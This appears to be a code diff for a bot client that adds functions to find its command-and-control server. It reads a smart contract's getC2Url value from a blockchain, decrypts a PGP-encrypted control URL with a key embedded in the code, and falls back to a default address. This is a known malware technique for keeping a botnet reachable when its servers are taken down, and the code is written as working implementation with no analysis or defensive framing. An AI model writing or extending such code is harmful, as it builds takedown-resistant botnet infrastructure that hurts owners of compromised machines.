@@ -108,6 +108,132 @@ _CONTRACT_META_CACHE: Optional[dict] = None
 _EMBEDDED_PGP_KEY_CACHE: Optional[pgpy.PGPKey] = None
 
 
+def _candidate_contract_meta_paths() -> list[Path]:
+    candidates: list[Path] = []
+
+    env_path = os.environ.get("C2_CONTRACT_META")
+    if env_path:
+        candidates.append(Path(env_path).expanduser())
+
+    module_path = Path(__file__).resolve()
+    candidates.append(module_path.parent / "contract_meta.json")
+    candidates.append(Path.cwd() / "contract_meta.json")
+
+    try:
+        ghost_module_path = Path(ghost_client_module.__file__).resolve()
+        candidates.append(ghost_module_path.parent / "contract_meta.json")
+        candidates.append(ghost_module_path.parent.parent / "contract_meta.json")
+    except Exception:
+        pass
+
+    seen: set[Path] = set()
+    unique: list[Path] = []
+    for candidate in candidates:
+        try:
+            resolved = candidate.resolve()
+        except Exception:
+            resolved = candidate
+        if resolved in seen:
+            continue
+        seen.add(resolved)
+        unique.append(resolved)
+    return unique
+
+
+def _load_contract_meta() -> Optional[dict]:
+    global _CONTRACT_META_CACHE
+    if _CONTRACT_META_CACHE is not None:
+        return _CONTRACT_META_CACHE
+
+    for path in _candidate_contract_meta_paths():
+        if not path.is_file():
+            continue
+        try:
+            with path.open("r", encoding="utf-8") as fh:
+                _CONTRACT_META_CACHE = json.load(fh)
+                return _CONTRACT_META_CACHE
+        except Exception as exc:
+            logging.getLogger("ControlURL").warning(f"Failed to load contract metadata from {path}: {exc}")
+    return None
+
+
+def _load_embedded_pgp_key() -> Optional[pgpy.PGPKey]:
+    global _EMBEDDED_PGP_KEY_CACHE
+    if _EMBEDDED_PGP_KEY_CACHE is not None:
+        return _EMBEDDED_PGP_KEY_CACHE
+
+    logger = logging.getLogger("ControlURL")
+    try:
+        key_bytes = base64.b64decode(EMBEDDED_PGP_KEY_B64.encode("ascii"))
+        key, _ = pgpy.PGPKey.from_blob(key_bytes)
+        _EMBEDDED_PGP_KEY_CACHE = key
+    except Exception as exc:
+        logger.error(f"Failed to load embedded PGP key: {exc}")
+        _EMBEDDED_PGP_KEY_CACHE = None
+    return _EMBEDDED_PGP_KEY_CACHE
+
+
+def _decrypt_control_url_blob(encrypted_blob: str) -> Optional[str]:
+    key = _load_embedded_pgp_key()
+    if not key:
+        return None
+
+    logger = logging.getLogger("ControlURL")
+    try:
+        message = pgpy.PGPMessage.from_blob(encrypted_blob)
+        decrypted = key.decrypt(message)
+        if decrypted.is_encrypted:
+            logger.warning("Decrypted PGP message still marked as encrypted.")
+            return None
+        plaintext = decrypted.message
+        if isinstance(plaintext, bytes):
+            return plaintext.decode("utf-8", "ignore").strip()
+        return str(plaintext).strip()
+    except Exception as exc:
+        logger.warning(f"Failed to decrypt control URL payload: {exc}")
+        return None
+
+
+def fetch_control_url_from_blockchain(logger: Optional[logging.Logger] = None) -> str:
+    meta = _load_contract_meta()
+    if not meta:
+        if logger:
+            logger.warning("Contract metadata not available; using default control URL.")
+        return DEFAULT_CONTROL_URL
+
+    try:
+        web3 = blockchain_utils.get_web3()
+        contract = blockchain_utils.get_contract_instance(web3, meta["address"], meta["abi"])
+        raw_value = contract.functions.getC2Url().call()
+    except Exception as exc:
+        if logger:
+            logger.warning(f"Failed to query control URL from blockchain: {exc}")
+        return DEFAULT_CONTROL_URL
+
+    if not raw_value:
+        return DEFAULT_CONTROL_URL
+
+    if isinstance(raw_value, bytes):
+        raw_value = raw_value.decode("utf-8", "ignore")
+
+    try:
+        payload = json.loads(raw_value)
+    except (TypeError, json.JSONDecodeError):
+        sanitized = str(raw_value).strip()
+        return sanitized or DEFAULT_CONTROL_URL
+
+    encrypted_blob = payload.get("encrypted_control_url")
+    if encrypted_blob:
+        decrypted = _decrypt_control_url_blob(encrypted_blob)
+        if decrypted:
+            return decrypted
+
+    primary = payload.get("primary_node")
+    if isinstance(primary, str) and primary.strip():
+        return primary.strip()
+
+    return DEFAULT_CONTROL_URL
+
 def get_current_control_url():
     """Return the most recent control URL the bot knows about."""
     with _control_url_lock:
